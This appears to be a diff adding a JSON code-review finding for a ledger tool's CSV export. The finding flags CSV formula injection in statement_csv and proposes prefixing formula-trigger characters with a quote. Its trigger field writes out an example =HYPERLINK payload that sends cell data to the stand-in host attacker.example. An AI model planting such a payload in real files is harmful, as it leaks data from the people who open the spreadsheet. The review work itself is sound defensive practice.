@@ -1,0 +1,75 @@
+{
+  "batch": {
+    "id": "initial",
+    "phase": "initial"
+  },
+  "candidates": [
+    {
+      "action": "must-fix",
+      "anchor": {
+        "end_line": 18,
+        "path": "ledger/export.py",
+        "side": "RIGHT",
+        "start_line": 18,
+        "type": "line"
+      },
+      "change": "In ledger/export.py's statement_csv, before writing each row, prefix any field whose text begins with =, +, -, @, a tab, or a carriage return with a single quote (the standard CSV/formula-injection neutralization), so the cell is forced to render as text in the destination spreadsheet.",
+      "claim": "statement_csv writes each entry's free-text description into a CSV cell verbatim, with no neutralization of a leading =, +, -, @, tab, or CR, so a description that starts with one of those characters becomes a live formula when the exported file is opened in Excel or Google Sheets.",
+      "evidence": [
+        {
+          "coordinate": "ledger/export.py:18",
+          "text": "writer.writerows(statement_rows(account))"
+        },
+        {
+          "coordinate": "ledger/accounts.py:58",
+          "text": "entry = Entry(day, description, amount)"
+        },
+        {
+          "coordinate": "ledger/accounts.py:15",
+          "text": "description: str"
+        },
+        {
+          "coordinate": "issue-3/pr-body",
+          "text": "accountants want to open them in a spreadsheet"
+        }
+      ],
+      "fix": "ledger/export.py:13-19",
+      "id": "export/csv-formula-injection",
+      "impact": "The spreadsheet application evaluates the injected formula on open, which can exfiltrate other cell data to an attacker-controlled URL (HYPERLINK/IMPORTXML-style payloads) or, on configurations where legacy dynamic-data-exchange formulas are still honored, run an external command — directly targeting the accountants the issue names as the feature's consumer.",
+      "kind": "security",
+      "priority": "P2",
+      "ranges": {
+        "anchor": {
+          "coordinate": "ledger/export.py:13-19",
+          "text": "ledger/export.py: +1,19"
+        },
+        "fix": {
+          "coordinate": "ledger/export.py:13-19",
+          "text": "ledger/export.py: +1,19"
+        }
+      },
+      "requirement_source": "issue-3/pr-body",
+      "title": "Neutralize formula-trigger characters before writing CSV cells",
+      "trigger": "An entry is posted with a description beginning with a formula-trigger character, e.g. `=HYPERLINK(\"http://attacker.example/?\"&A1,\"x\")`, via Ledger.post (ledger/accounts.py), which accepts the description as an arbitrary string with no character restriction; the account's statement is then exported with `ledger statement FILE ACCOUNT --format csv` and the resulting file is opened in a spreadsheet application, which the issue names as the intended consumer."
+    }
+  ],
+  "premises": [],
+  "run": {
+    "base": "2301c83ee0b2ba0248fe3d2d1f6cd481963545ab",
+    "head": "0eb283dfe715341548387bf65af857affedf5dfa",
+    "id": "review-0eb283d",
+    "merge_base": "2301c83ee0b2ba0248fe3d2d1f6cd481963545ab",
+    "repository": "/tmp/rcs-savings/baseline/publishable/repo"
+  },
+  "run_policy": "Focused commands at most five minutes, provisioning ten; no production service, credentials, or destructive effect. No network access.",
+  "sources": [
+    {
+      "coordinate": "issue-3/pr-body",
+      "text": "Statements are text-only today; accountants want to open them in a spreadsheet."
+    },
+    {
+      "coordinate": "issue-3/acceptance-criterion-4",
+      "text": "Descriptions containing commas, quotes, or newlines round-trip through Python's csv.reader."
+    }
+  ]
+}
